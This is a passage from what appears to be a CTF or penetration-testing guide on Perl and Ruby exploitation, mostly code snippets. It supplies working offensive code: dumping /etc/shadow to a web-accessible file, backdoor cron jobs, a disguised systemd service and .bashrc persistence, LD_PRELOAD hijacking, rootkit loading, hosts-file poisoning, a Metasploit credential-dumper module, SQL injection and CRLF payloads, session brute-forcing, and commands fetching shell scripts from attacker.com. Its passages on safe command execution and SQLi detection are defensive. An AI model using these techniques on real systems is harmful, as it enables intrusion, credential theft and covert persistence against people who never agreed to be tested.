    Proto    => 'udp'
) or die "UDP socket failed: $!";

$socket->send("payload");
$socket->recv(my $data, 1024);
```

**Low-Level Socket Primitives:**

```perl
use Socket;

socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
my $dest = sockaddr_in(4444, inet_aton('10.10.14.5'));
connect(SOCK, $dest) or die "Connect failed: $!";

send(SOCK, "data", 0);
recv(SOCK, my $buffer, 4096, 0);
close(SOCK);
```

**Multi-threaded Network Scanner:**

```perl
use IO::Socket::INET;
use threads;

sub scan_port {
    my ($host, $port) = @_;
    my $sock = IO::Socket::INET->new(
        PeerAddr => $host,
        PeerPort => $port,
        Proto    => 'tcp',
        Timeout  => 2
    );
    print "[+] Port $port open\n" if $sock;
}

my @threads;
for my $port (1..1024) {
    push @threads, threads->create(\&scan_port, '192.168.1.1', $port);
}
$_->join() for @threads;
```

**Non-blocking Sockets:**

```perl
use IO::Socket::INET;
use IO::Select;

my $socket = IO::Socket::INET->new(
    PeerAddr => '10.10.14.5',
    PeerPort => 4444,
    Proto    => 'tcp',
    Blocking => 0
);

my $select = IO::Select->new($socket);
if ($select->can_read(5)) {
    my $data = <$socket>;
}
```

### Regex for Data Parsing

Perl's regular expression engine is exceptionally powerful for parsing network traffic, log files, configuration files, and extracting sensitive data during exploitation.

**Credential Extraction Patterns:**

```perl
# Extract passwords from configuration files
while (<FILE>) {
    if (/password\s*[=:]\s*['"]?([^'"\s]+)['"]?/i) {
        print "Found password: $1\n";
    }
}

# Extract usernames
if ($content =~ /user(?:name)?\s*[=:]\s*['"]?(\w+)['"]?/i) {
    my $username = $1;
}

# Email addresses
my @emails = $content =~ /\b[\w\.-]+@[\w\.-]+\.\w+\b/g;

# IP addresses
my @ips = $content =~ /\b(?:\d{1,3}\.){3}\d{1,3}\b/g;
```

**Hash Extraction:**

```perl
# MD5 hashes
my @md5_hashes = $content =~ /\b[a-f0-9]{32}\b/gi;

# SHA-1 hashes
my @sha1_hashes = $content =~ /\b[a-f0-9]{40}\b/gi;

# SHA-256 hashes
my @sha256_hashes = $content =~ /\b[a-f0-9]{64}\b/gi;

# NTLM hashes (format: username:RID:LM:NTLM)
while ($content =~ /^([^:]+):(\d+):([a-f0-9]{32}):([a-f0-9]{32})/gmi) {
    print "User: $1, NTLM: $4\n";
}
```

**HTTP Response Parsing:**

```perl
my $http_response = <$socket>;

# Extract status code
if ($http_response =~ /^HTTP\/[\d.]+\s+(\d{3})\s+(.+)$/m) {
    my ($status, $message) = ($1, $2);
}

# Extract headers
my %headers;
while ($http_response =~ /^([^:]+):\s*(.+)$/gm) {
    $headers{lc($1)} = $2;
}

# Extract cookies
my @cookies = $http_response =~ /Set-Cookie:\s*([^;]+)/gi;

# Extract CSRF tokens
if ($http_response =~ /<input[^>]+name=["']csrf["'][^>]+value=["']([^"']+)["']/i) {
    my $csrf_token = $1;
}
```

**Log File Analysis:**

```perl
# Apache/Nginx access log parsing
while (<LOG>) {
    if (/^(\S+)\s+\S+\s+\S+\s+\[([^\]]+)\]\s+"(\S+)\s+([^\s"]+)\s+([^"]+)"\s+(\d+)\s+(\d+)/) {
        my ($ip, $timestamp, $method, $uri, $protocol, $status, $size) = 
           ($1, $2, $3, $4, $5, $6, $7);
        print "Potential SQL injection: $uri\n" if $uri =~ /['";\-]/;
    }
}

# SSH authentication attempts
while (<AUTH_LOG>) {
    if (/Failed password for (\w+) from ([\d.]+) port (\d+)/) {
        print "Failed login: $1 from $2\n";
    }
}
```

**SQL Injection Pattern Detection:**

```perl
my @sqli_patterns = (
    qr/['";].*(?:OR|AND).*['";]/i,
    qr/UNION\s+(?:ALL\s+)?SELECT/i,
    qr/(?:DROP|DELETE|INSERT|UPDATE).*(?:TABLE|FROM)/i,
    qr/\/\*.*\*\//,
    qr/--[^\n]*/,
    qr/xp_cmdshell/i
);

foreach my $pattern (@sqli_patterns) {
    if ($input =~ /$pattern/) {
        print "Potential SQLi detected\n";
    }
}
```

**Binary Data Parsing:**

```perl
# Parse binary protocol headers
my ($magic, $version, $length) = unpack("A4 n N", $binary_data);

# Extract specific byte ranges
my $header = substr($data, 0, 16);
my @bytes = unpack("C*", $header);

# Hexdump with regex for pattern finding
my $hex = unpack("H*", $binary_data);
if ($hex =~ /(4d5a90)/) {  # MZ header
    print "PE executable detected\n";
}
```

**Named Capture Groups:**

```perl
# Extract structured data
if ($line =~ /user=(?<user>\w+).*password=(?<pass>\S+)/i) {
    print "User: $+{user}, Pass: $+{pass}\n";
}

# Parse SSH keys
if ($content =~ /(?<type>ssh-(?:rsa|dss|ed25519))\s+(?<key>[A-Za-z0-9+\/=]+)\s+(?<comment>.*)/) {
    print "Key type: $+{type}\n";
}
```

### File I/O Operations

Perl's file handling capabilities are essential for reading configuration files, writing payloads, manipulating system files, and exfiltrating data.

**Basic File Operations:**

```perl
# Read entire file into scalar
open(my $fh, '<', '/etc/passwd') or die "Cannot open: $!";
my $content = do { local $/; <$fh> };
close($fh);

# Read line by line
open(my $fh, '<', 'file.txt') or die $!;
while (my $line = <$fh>) {
    chomp($line);
    # Process line
}
close($fh);

# Write to file
open(my $fh, '>', 'output.txt') or die $!;
print $fh "data\n";
close($fh);

# Append to file
open(my $fh, '>>', 'log.txt') or die $!;
print $fh "[+] Entry\n";
close($fh);
```

**Binary File Operations:**

```perl
# Read binary file
open(my $fh, '<:raw', 'binary.dat') or die $!;
binmode($fh);
read($fh, my $data, -s $fh);
close($fh);

# Write binary data
open(my $fh, '>:raw', 'payload.bin') or die $!;
binmode($fh);
print $fh pack("C*", 0x90, 0x90, 0x90);  # NOP sled
close($fh);
```

**File Searching and Enumeration:**

```perl
use File::Find;

# Recursive search for writable files
find(sub {
    return unless -f;
    return unless -w;
    print "$File::Find::name is writable\n";
}, '/var/www');

# Search for SUID binaries
find(sub {
    return unless -f;
    my $mode = (stat($_))[2];
    print "$File::Find::name\n" if ($mode & 04000);
}, '/usr');

# Find files with specific patterns
find(sub {
    return unless /\.(conf|cfg|ini)$/i;
    open(my $fh, '<', $_) or return;
    my $content = do { local $/; <$fh> };
    print "$File::Find::name contains password\n" if $content =~ /password/i;
}, '/etc');
```

**Directory Operations:**

```perl
# List directory contents
opendir(my $dh, '/etc') or die $!;
my @files = readdir($dh);
closedir($dh);

# Filter specific files
my @configs = grep { /\.conf$/ } @files;

# Create directory
mkdir('/tmp/exploit', 0755) or die $!;

# Recursive directory creation
use File::Path qw(make_path);
make_path('/tmp/a/b/c', { mode => 0755 });
```

**Temporary File Operations:**

```perl
use File::Temp;

# Create temporary file
my $fh = File::Temp->new(
    TEMPLATE => 'payloadXXXXX',
    DIR => '/tmp',
    SUFFIX => '.sh',
    UNLINK => 0  # Don't auto-delete
);
print $fh "#!/bin/bash\n";
print $fh "rm -rf /tmp/exploit\n";
my $filename = $fh->filename;

# Create temporary directory
my $dir = File::Temp->newdir(
    TEMPLATE => 'exploitXXXXX',
    DIR => '/tmp',
    CLEANUP => 0
);
```

**File Permission Manipulation:**

```perl
# Change permissions
chmod(0777, 'exploit.sh');
chmod(04755, '/tmp/suid_binary');  # Set SUID

# Change ownership (requires root)
chown($uid, $gid, 'file.txt');

# Get file permissions
my $mode = (stat('file.txt'))[2];
printf "Permissions: %04o\n", $mode & 07777;
```

**File Content Manipulation:**

```perl
# In-place file editing
use Tie::File;
tie my @lines, 'Tie::File', '/etc/hosts' or die $!;
push @lines, "10.10.14.5 malicious.local";
untie @lines;

# Perl one-liner in-place editing
# perl -pi -e 's/old/new/g' file.txt

# Slurp and modify
{
    local $/;
    open(my $fh, '<', 'config.php') or die $!;
    my $content = <$fh>;
    close($fh);
    
    $content =~ s/(password\s*=\s*)['"].*?['"]/$1'pwned'/gi;
    
    open($fh, '>', 'config.php') or die $!;
    print $fh $content;
    close($fh);
}
```

**File Locking:**

```perl
use Fcntl ':flock';

open(my $fh, '>>', 'shared.log') or die $!;
flock($fh, LOCK_EX) or die "Cannot lock: $!";
print $fh "Log entry\n";
flock($fh, LOCK_UN);
close($fh);
```

**Data Exfiltration:**

```perl
# Base64 encode and exfiltrate
use MIME::Base64;

open(my $fh, '<:raw', '/etc/shadow') or die $!;
my $data = do { local $/; <$fh> };
close($fh);

my $encoded = encode_base64($data);
# Send via network socket or write to web-accessible directory
open(my $out, '>', '/var/www/html/data.txt') or die $!;
print $out $encoded;
close($out);
```

### System Integration

Perl excels at system integration tasks, allowing direct interaction with the operating system, process manipulation, and privilege escalation techniques.

**Command Execution Methods:**

```perl
# Backticks (captures output)
my $output = `whoami`;
my $users = `cat /etc/passwd`;

# system() - returns exit status
system("ls -la /tmp");
my $exit_code = system("grep root /etc/passwd");

# exec() - replaces current process
exec("/bin/sh") or die "Exec failed: $!";

# Open pipe for reading
open(my $pipe, '-|', 'ps aux') or die $!;
while (<$pipe>) {
    print if /root/;
}
close($pipe);

# Open pipe for writing
open(my $pipe, '|-', 'mail user@domain.com') or die $!;
print $pipe "Subject: Data\n\n$sensitive_data";
close($pipe);
```

**Safe Command Execution (Avoiding Shell Injection):**

```perl
# List form bypasses shell
system('ls', '-la', $user_input);  # Safe

# Avoid this with untrusted input
system("ls -la $user_input");  # Vulnerable

# Using qx// with list
use IPC::System::Simple qw(capture);
my $output = capture('grep', $pattern, $file);
```

**Process Manipulation:**

```perl
# Fork and execute
my $pid = fork();
if ($pid == 0) {
    # Child process
    exec('/bin/sh', '-c', 'exploit.sh');
    die "Exec failed: $!";
} elsif ($pid > 0) {
    # Parent process
    waitpid($pid, 0);
    my $exit_status = $? >> 8;
} else {
    die "Fork failed: $!";
}

# Daemonize process
use POSIX 'setsid';
my $pid = fork();
exit if $pid;
die "Fork failed: $!" unless defined($pid);
setsid() or die "Cannot start new session: $!";
chdir('/') or die $!;
open(STDIN, '<', '/dev/null');
open(STDOUT, '>', '/dev/null');
open(STDERR, '>&STDOUT');
```

**Environment Variable Manipulation:**

```perl
# Read environment
my $path = $ENV{PATH};
my $home = $ENV{HOME};

# Modify environment for subprocesses
$ENV{LD_PRELOAD} = '/tmp/evil.so';
system('./vulnerable_binary');

# Clear sensitive variables
delete $ENV{LD_PRELOAD};
delete $ENV{LD_LIBRARY_PATH};

# Set environment for privilege escalation
$ENV{PATH} = '/tmp:/usr/bin:/bin';
```

**User and Group Information:**

```perl
# Get current user info
my $uid = $<;          # Real UID
my $euid = $>;         # Effective UID
my $gid = $(;          # Real GID
my $egid = $);         # Effective GID

my $username = getpwuid($uid);
my ($name, $passwd, $uid, $gid, $quota, $comment, $gcos, $dir, $shell) = getpwnam('root');

# Check if running as root
die "Must run as root" unless $> == 0;

# Get all users
setpwent();
while (my @pwent = getpwent()) {
    print "User: $pwent[0], UID: $pwent[2]\n";
}
endpwent();
```

**Privilege Operations:**

```perl
# Change effective UID/GID (requires root)
$> = 1000;  # Change EUID
$) = 1000;  # Change EGID

# Drop privileges permanently
$< = $> = 1000;
$( = $) = 1000;

# Check capabilities (on Linux)
my $caps = `getcap /usr/bin/perl 2>/dev/null`;
print "Capabilities: $caps\n" if $caps;
```

**System Information Gathering:**

```perl
# Kernel version
my $kernel = `uname -r`;

# Distribution info
my $os_release = `cat /etc/os-release 2>/dev/null`;
my $lsb_release = `lsb_release -a 2>/dev/null`;

# Hostname
use Sys::Hostname;
my $hostname = hostname();

# Network interfaces
my @interfaces = `ip addr show`;
my @ifconfig = `ifconfig -a`;

# Mounted filesystems
open(my $fh, '<', '/proc/mounts') or die $!;
while (<$fh>) {
    my ($device, $mount, $type) = split;
    print "Mount: $mount ($type)\n";
}
```

**Signal Handling:**

```perl
# Trap signals
$SIG{INT} = sub {
    print "Caught SIGINT, cleaning up...\n";
    cleanup();
    exit(0);
};

$SIG{TERM} = 'IGNORE';  # Ignore SIGTERM
$SIG{HUP} = \&reload_config;

# Send signal to process
kill('TERM', $target_pid);
kill('KILL', $target_pid);  # SIGKILL
```

**Kernel Module Interaction:**

```perl
# Load kernel module (requires root)
system('insmod', '/tmp/rootkit.ko');

# Check loaded modules
my @modules = `lsmod`;
foreach (@modules) {
    print if /suspicious/;
}

# Read from /proc
open(my $fh, '<', '/proc/sys/kernel/randomize_va_space') or die $!;
my $aslr = <$fh>;
chomp($aslr);
print "ASLR status: $aslr\n";
```

**Cron Job Manipulation:**

```perl
# Read user crontab
my $crontab = `crontab -l 2>/dev/null`;

# Install backdoor crontab
open(my $pipe, '|-', 'crontab -') or die $!;
print $pipe "* * * * * /tmp/backdoor.sh\n";
print $pipe $crontab if $crontab;  # Preserve existing
close($pipe);

# System-wide cron
open(my $fh, '>>', '/etc/cron.d/backdoor') or die $!;
print $fh "* * * * * root /tmp/persist.sh\n";
close($fh);
chmod(0644, '/etc/cron.d/backdoor');
```

**Persistence Mechanisms:**

```perl
# Add to bashrc
open(my $fh, '>>', "$ENV{HOME}/.bashrc") or die $!;
print $fh "\n# System update check\n";
print $fh "nohup /tmp/backdoor &>/dev/null &\n";
close($fh);

# Systemd service (requires root)
my $service = <<'EOF';
[Unit]
Description=System Monitor
After=network.target

[Service]
Type=simple
ExecStart=/tmp/backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF

open(my $fh, '>', '/etc/systemd/system/monitor.service') or die $!;
print $fh $service;
close($fh);
system('systemctl daemon-reload');
system('systemctl enable monitor.service');
system('systemctl start monitor.service');
```

**Important Notes:**

- [Inference] The command execution examples assume a Unix-like environment; Windows equivalents would use different system commands
- Always validate file paths and user input before using them in system calls to prevent command injection vulnerabilities
- [Unverified] Some privilege escalation techniques may not work on systems with enhanced security measures (SELinux, AppArmor)
- When exploiting setuid binaries, verify the effective UID changes persist through the exploitation chain

---

## Ruby Exploitation

### Metasploit Module Development

Ruby is the core language of the Metasploit Framework, making Ruby proficiency essential for creating custom exploits, auxiliary modules, post-exploitation modules, and payloads.

#### Module Structure and Classification

Metasploit modules follow a standardized directory structure under `/usr/share/metasploit-framework/modules/`:

- **Exploits** (`exploits/`): Modules that leverage vulnerabilities to gain access
- **Auxiliary** (`auxiliary/`): Scanning, fuzzing, and non-exploit attack modules
- **Post** (`post/`): Post-exploitation modules for privilege escalation, lateral movement, persistence
- **Payloads** (`payloads/`): Code executed after successful exploitation
- **Encoders** (`encoders/`): Obfuscate payloads to evade detection
- **Nops** (`nops/`): No-operation code for buffer alignment

#### Basic Module Template

A minimal exploit module structure:

```ruby
require 'msf/core'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::Tcp

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Sample Exploit Module',
      'Description'    => %q{
        Detailed description of the vulnerability
      },
      'Author'         => ['Your Name'],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          ['CVE', '2024-XXXXX'],
          ['URL', 'https://example.com/advisory']
        ],
      'Platform'       => 'linux',
      'Targets'        =>
        [
          ['Target Description', { 'Ret' => 0x41414141 }]
        ],
      'DefaultTarget'  => 0,
      'DisclosureDate' => '2024-01-01'
    ))

    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [true, 'The base path', '/'])
      ])
  end

  def check
    # Vulnerability detection logic
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'version')
    })

    return Exploit::CheckCode::Unknown if res.nil?
    return Exploit::CheckCode::Vulnerable if res.body =~ /vulnerable_version/
    Exploit::CheckCode::Safe
  end

  def exploit
    # Exploitation logic
    connect
    payload_data = generate_payload
    sock.put(payload_data)
    handler
    disconnect
  end
end
```

#### Key Module Components

**Ranking System**:

- `ManualRanking`: Requires manual configuration, may cause instability
- `LowRanking`: Unlikely to work reliably
- `AverageRanking`: Common default, should work often
- `NormalRanking`: Expected to work most of the time
- `GoodRanking`: Reliable in most scenarios
- `GreatRanking`: Very reliable with minimal side effects
- `ExcellentRanking`: Should always work without side effects

**Mixins for Network Protocols**:

```ruby
include Msf::Exploit::Remote::Tcp        # TCP connections
include Msf::Exploit::Remote::Udp        # UDP connections
include Msf::Exploit::Remote::HttpClient # HTTP/HTTPS requests
include Msf::Exploit::Remote::Ftp        # FTP operations
include Msf::Exploit::Remote::SMB        # SMB/CIFS operations
include Msf::Exploit::Remote::DCERPC     # Windows RPC
```

**Option Registration**:

```ruby
register_options([
  OptString.new('TARGETURI', [true, 'Base path', '/']),
  OptInt.new('RPORT', [true, 'Remote port', 80]),
  OptBool.new('SSL', [true, 'Use SSL', false]),
  OptEnum.new('METHOD', [true, 'HTTP method', 'GET', ['GET', 'POST']]),
  OptPath.new('WORDLIST', [false, 'Path to wordlist'])
])

register_advanced_options([
  OptInt.new('TIMEOUT', [true, 'Connection timeout', 30])
])
```

#### Auxiliary Module Development

Auxiliary modules for scanning and information gathering:

```ruby
class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'HTTP Service Scanner',
      'Description' => 'Scans for specific HTTP services',
      'Author'      => ['Your Name'],
      'License'     => MSF_LICENSE
    ))
  end

  def run_host(ip)
    begin
      res = send_request_cgi({
        'method' => 'GET',
        'uri'    => '/'
      })

      if res && res.code == 200
        print_good("#{ip}:#{rport} - Found service")
        report_service(
          :host => ip,
          :port => rport,
          :proto => 'tcp',
          :name => 'http'
        )
      end
    rescue ::Rex::ConnectionError
      print_error("#{ip}:#{rport} - Connection failed")
    end
  end
end
```

**Scanner Mixin Threading**: The `Msf::Auxiliary::Scanner` mixin automatically handles threading via `run_host(ip)` method, processing multiple hosts concurrently based on the `THREADS` option.

#### Post-Exploitation Module Structure

```ruby
class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::System

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Linux Credential Dumper',
      'Description'   => 'Extracts credentials from Linux system',
      'License'       => MSF_LICENSE,
      'Platform'      => 'linux',
      'SessionTypes'  => ['meterpreter', 'shell']
    ))
  end

  def run
    print_status("Checking for /etc/shadow access")
    
    unless readable?('/etc/shadow')
      print_error("Cannot read /etc/shadow")
      return
    end

    shadow_data = read_file('/etc/shadow')
    passwd_data = read_file('/etc/passwd')
    
    store_loot(
      'linux.shadow',
      'text/plain',
      session,
      shadow_data,
      'shadow.txt',
      'Linux shadow file'
    )

    print_good("Credentials stored in loot")
  end
end
```

#### Module Development Workflow

**1. Module Placement**: Place custom modules in `~/.msf4/modules/` to avoid framework updates overwriting them:

```bash
mkdir -p ~/.msf4/modules/exploits/custom
mkdir -p ~/.msf4/modules/auxiliary/custom
```

**2. Reload Modules**: Within `msfconsole`:

```
reload_all                    # Reload all modules
reload_module exploit/path    # Reload specific module
```

**3. Testing and Debugging**:

```ruby
# Add debugging output
vprint_status("Debug info")    # Verbose output (VERBOSE=true)
print_error("Error message")
print_good("Success message")
print_warning("Warning message")

# Framework debugging
set LogLevel 3                 # In msfconsole
```

**4. Module Validation**:

```bash
# Syntax check
ruby -c /path/to/module.rb

# Load in msfconsole
msf6 > use exploit/path/to/module
msf6 > info
msf6 > check
```

### HTTP Libraries

Ruby provides multiple HTTP libraries for web exploitation, each with distinct capabilities for CTF scenarios.

#### Net::HTTP (Standard Library)

Basic HTTP client included in Ruby standard library:

```ruby
require 'net/http'
require 'uri'

# Simple GET request
uri = URI('http://target.com/api/endpoint')
response = Net::HTTP.get_response(uri)
puts response.body

# GET with parameters
uri = URI('http://target.com/search')
params = { q: 'query', limit: 10 }
uri.query = URI.encode_www_form(params)
response = Net::HTTP.get_response(uri)

# POST request
uri = URI('http://target.com/login')
response = Net::HTTP.post_form(uri, 'username' => 'admin', 'password' => 'pass')

# Advanced request with headers
uri = URI('http://target.com/api')
http = Net::HTTP.new(uri.host, uri.port)

# SSL/TLS configuration
http.use_ssl = true
http.verify_mode = OpenSSL::SSL::VERIFY_NONE  # For self-signed certs

request = Net::HTTP::Get.new(uri.request_uri)
request['User-Agent'] = 'CustomAgent/1.0'
request['Authorization'] = 'Bearer token123'
request['Cookie'] = 'session=abc123'

response = http.request(request)
puts response.code
puts response.body
```

**Custom Request Methods**:

```ruby
uri = URI('http://target.com/resource')
http = Net::HTTP.new(uri.host, uri.port)

# PUT request
put_request = Net::HTTP::Put.new(uri.path)
put_request.body = '{"key": "value"}'
put_request['Content-Type'] = 'application/json'
response = http.request(put_request)

# DELETE request
delete_request = Net::HTTP::Delete.new(uri.path)
response = http.request(delete_request)

# Custom HTTP methods
custom_request = Net::HTTPGenericRequest.new(
  'TRACE',          # HTTP method
  true,             # has response body
  false,            # has request body
  uri.path
)
response = http.request(custom_request)
```

**Handling Redirects**:

```ruby
def fetch(uri_str, limit = 10)
  raise ArgumentError, 'HTTP redirect too deep' if limit == 0

  uri = URI(uri_str)
  response = Net::HTTP.get_response(uri)

  case response
  when Net::HTTPSuccess then response
  when Net::HTTPRedirection then fetch(response['location'], limit - 1)
  else
    response.error!
  end
end
```

**Multipart Form Data** [Inference - requires additional gem]:

```ruby
require 'net/http/post/multipart'

uri = URI('http://target.com/upload')
File.open('file.txt') do |file|
  request = Net::HTTP::Post::Multipart.new(
    uri.path,
    'file' => UploadIO.new(file, 'text/plain', 'file.txt'),
    'description' => 'Test upload'
  )
  
  response = Net::HTTP.start(uri.host, uri.port) do |http|
    http.request(request)
  end
end
```

#### Rex::Proto::Http (Metasploit)

Metasploit's HTTP library with built-in evasion and advanced features:

```ruby
# In Metasploit modules
include Msf::Exploit::Remote::HttpClient

# Basic request
res = send_request_cgi({
  'method' => 'GET',
  'uri'    => normalize_uri(target_uri.path, 'admin', 'panel')
})

# POST with data
res = send_request_cgi({
  'method' => 'POST',
  'uri'    => '/login',
  'vars_post' => {
    'username' => 'admin',
    'password' => 'password123'
  }
})

# Custom headers and cookies
res = send_request_cgi({
  'method' => 'GET',
  'uri'    => '/protected',
  'headers' => {
    'X-Custom-Header' => 'value',
    'Authorization' => 'Bearer token123'
  },
  'cookie' => 'PHPSESSID=abc123; user=admin'
})

# RAW request (full control)
res = send_request_raw({
  'uri' => '/endpoint',
  'method' => 'GET',
  'data' => "Custom\r\nHTTP\r\nPayload\r\n\r\n"
})
```

**Path Normalization** [Inference - prevents double-slash issues]:

```ruby
# Properly combine URI components
path = normalize_uri(target_uri.path, 'api', 'v1', 'users')
# Handles: '/api/v1/users', '//api//v1//users', etc. → '/api/v1/users'

# Encode path for safety
encoded = normalize_uri(target_uri.path, '../../../etc/passwd')
```

**Cookie Management**:

```ruby
# Extract cookies from response
if res && res.get_cookies.length > 0
  cookies = res.get_cookies
  print_status("Cookies: #{cookies}")
end

# Subsequent requests with cookies
cookie_jar = res.get_cookies
res2 = send_request_cgi({
  'method' => 'GET',
  'uri' => '/dashboard',
  'cookie' => cookie_jar
})
```

**HTTP Connection Management**:

```ruby
# Persistent connection
def exploit
  connect  # Establish connection
  
  # Multiple requests over same connection
  send_request_raw({'uri' => '/check1'})
  send_request_raw({'uri' => '/check2'})
  
  disconnect  # Close connection
end
```

#### OpenURI (Simple Read Operations)

Simplified HTTP access for basic read operations:

```ruby
require 'open-uri'

# Simple read
content = URI.open('http://target.com/file.txt').read

# With headers
content = URI.open(
  'http://target.com/api',
  'User-Agent' => 'Ruby/OpenURI',
  'Authorization' => 'Bearer token'
).read

# Download to file
File.open('download.bin', 'wb') do |file|
  file.write URI.open('http://target.com/binary').read
end

# Handle redirects (automatic up to 10 redirects)
# Access response metadata
URI.open('http://target.com/endpoint') do |response|
  puts response.status
  puts response.base_uri
  puts response.meta
  puts response.read
end
```

**[Unverified]** OpenURI automatically follows redirects and handles basic authentication, but lacks fine-grained control compared to Net::HTTP.

#### HTTParty (Third-Party Gem)

High-level HTTP client with simplified syntax:

```bash
gem install httparty
```

```ruby
require 'httparty'

# GET request
response = HTTParty.get('http://target.com/api')
puts response.body
puts response.code
puts response.headers

# POST with JSON
response = HTTParty.post(
  'http://target.com/api/data',
  body: { key: 'value' }.to_json,
  headers: { 'Content-Type' => 'application/json' }
)

# Authentication
response = HTTParty.get(
  'http://target.com/protected',
  basic_auth: { username: 'user', password: 'pass' }
)

# Query parameters
response = HTTParty.get(
  'http://target.com/search',
  query: { q: 'ruby', limit: 50 }
)

# Class-based API wrapper
class APIClient
  include HTTParty
  base_uri 'http://target.com/api'
  headers 'User-Agent' => 'CustomClient/1.0'
  
  def self.get_users
    get('/users')
  end
  
  def self.create_user(data)
    post('/users', body: data.to_json, headers: { 'Content-Type' => 'application/json' })
  end
end

users = APIClient.get_users
```

#### HTTP Exploitation Techniques

**SQL Injection Testing**:

```ruby
require 'net/http'
require 'uri'

payloads = ["'", "' OR '1'='1", "' OR '1'='1' --", "admin'--"]

payloads.each do |payload|
  uri = URI('http://target.com/login')
  response = Net::HTTP.post_form(uri, 'username' => payload, 'password' => 'test')
  
  if response.body.include?('Welcome') || response.body.include?('Dashboard')
    puts "[+] Potential SQLi with payload: #{payload}"
  end
end
```

**Header Injection**:

```ruby
# CRLF injection attempt
headers = {
  'X-Forwarded-For' => "127.0.0.1\r\nX-Injected: malicious",
  'User-Agent' => "Agent\r\nSet-Cookie: admin=true"
}

uri = URI('http://target.com/endpoint')
http = Net::HTTP.new(uri.host, uri.port)
request = Net::HTTP::Get.new(uri.request_uri)

headers.each { |k, v| request[k] = v }
response = http.request(request)
```

**Session Enumeration**:

```ruby
# Brute force session tokens
(1..1000).each do |i|
  session_id = "sess_#{i.to_s.rjust(6, '0')}"
  
  response = send_request_cgi({
    'method' => 'GET',
    'uri' => '/account',
    'cookie' => "SESSIONID=#{session_id}"
  })
  
  if response && response.code == 200 && !response.body.include?('Login')
    print_good("Valid session: #{session_id}")
  end
end
```

### System Command Execution

Ruby provides multiple methods for executing system commands, each with different security implications and use cases in exploitation.

#### Backticks and %x

**Backticks** capture command output:

```ruby
# Execute and capture output
output = `whoami`
puts output.strip  # "root"

# With variables
username = `id -un`.strip
hostname = `hostname`.strip

# Multi-line commands
files = `find /tmp -name "*.txt" 2>/dev/null`
files.split("\n").each { |f| puts f }

# Exit status
output = `ls /nonexistent 2>&1`
if $?.success?
  puts "Command succeeded"
else
  puts "Command failed with status: #{$?.exitstatus}"
end
```

**%x operator** (alternative syntax):

```ruby
output = %x(ls -la /etc)
output = %x{cat /etc/passwd}
output = %x[ps aux | grep ssh]

# Useful for commands with many quotes
output = %x{echo "test" | sed 's/test/replaced/'}
```

**Security Risk**: Both methods are vulnerable to command injection:

```ruby
# DANGEROUS - user input not sanitized
filename = params[:file]  # Could be: "file.txt; rm -rf /"
content = `cat #{filename}`  # Executes: cat file.txt; rm -rf /
```

#### system()

Executes command and returns true/false based on success:

```ruby
# Basic execution
system('ls -la')  # true if success, false if failure, nil if command not found

# With output redirection
system('wget http://attacker.com/shell.sh -O /tmp/shell.sh')

# Conditional execution
if system('ping -c 1 10.10.10.10 > /dev/null 2>&1')
  puts "Target is reachable"
else
  puts "Target unreachable"
end

# Multiple arguments (safer - no shell interpretation)
system('curl', '-X', 'POST', '-d', user_data, 'http://target.com/api')

# Environment variables
system({'PATH' => '/custom/path'}, 'script.sh')
```

**Exit Status**:

```ruby
system('false')
puts $?.exitstatus  # 1

system('exit 42')
puts $?.exitstatus  # 42
```

#### exec()

Replaces current process with executed command (no return):

```ruby
# WARNING: This terminates the Ruby process
exec('bash')  # Current Ruby process becomes bash

# Useful in fork scenarios
pid = fork do
  exec('/usr/bin/payload', '--option', 'value')
end
Process.wait(pid)

# With environment
exec({'SECRET' => 'value'}, '/tmp/exploit.sh')
```

#### spawn()

Creates new process without blocking:

```ruby
# Non-blocking execution
pid = spawn('sleep 100')
puts "Command running with PID: #{pid}"

# Multiple arguments (safe from injection)
pid = spawn('curl', '-o', '/tmp/file', 'http://attacker.com/payload')

# With I/O redirection
pid = spawn('ls', '-la', out: '/tmp/listing.txt', err: '/tmp/errors.txt')
Process.wait(pid)

# Capture output via pipe
rd, wr = IO.pipe
pid = spawn('netstat -tuln', out: wr)
wr.close
output = rd.read
rd.close
Process.wait(pid)

# Detached process
pid = spawn('reverse_shell.sh', pgroup: true)
Process.detach(pid)  # Don't wait for completion
```

#### IO.popen()

Executes command with bidirectional I/O:

```ruby
# Read from command
IO.popen('ls -la /etc') do |io|
  while line = io.gets
    puts line
  end
end

# Write to command
IO.popen('base64 -d', 'w') do |io|
  io.puts 'SGVsbG8gV29ybGQ='
  io.close_write
end

# Bidirectional communication
IO.popen('python3 -c "import sys; print(sys.stdin.read().upper())"', 'r+') do |io|
  io.puts 'hello world'
  io.close_write
  puts io.read  # "HELLO WORLD"
end

# Array syntax (safer)
IO.popen(['grep', 'root', '/etc/passwd']) do |io|
  puts io.read
end

# Multiple commands with pipes
IO.popen('ps aux | grep ssh | awk \'{print $2}\'') do |io|
  pids = io.read.split("\n")
  pids.each { |pid| puts "SSH PID: #{pid}" }
end
```

#### Open3 Module

Advanced process control with separate stdout/stderr:

```ruby
require 'open3'

# Capture stdout, stderr, and status
stdout, stderr, status = Open3.capture3('ls /etc /nonexistent')
puts "Output: #{stdout}"
puts "Errors: #{stderr}"
puts "Status: #{status.exitstatus}"

# Pipeline execution
stdout, stderr, status = Open3.capture3('cat /etc/passwd | grep root | cut -d: -f1')

# With timeout [Inference - requires Ruby 2.6+]
require 'timeout'
begin
  Timeout.timeout(5) do
    stdout, stderr, status = Open3.capture3('sleep 100')
  end
rescue Timeout::Error
  puts "Command timed out"
end

# Interactive execution
Open3.popen3('nc -lvnp 4444') do |stdin, stdout, stderr, wait_thr|
  # Send data to process
  stdin.puts 'test input'
  stdin.close
  
  # Read output
  puts stdout.read
  
  # Wait for completion
  exit_status = wait_thr.value
  puts "Exit: #{exit_status}"
end

# Pipeline with multiple commands
Open3.pipeline_r('cat /etc/passwd', 'grep root') do |stdout, wait_thrs|
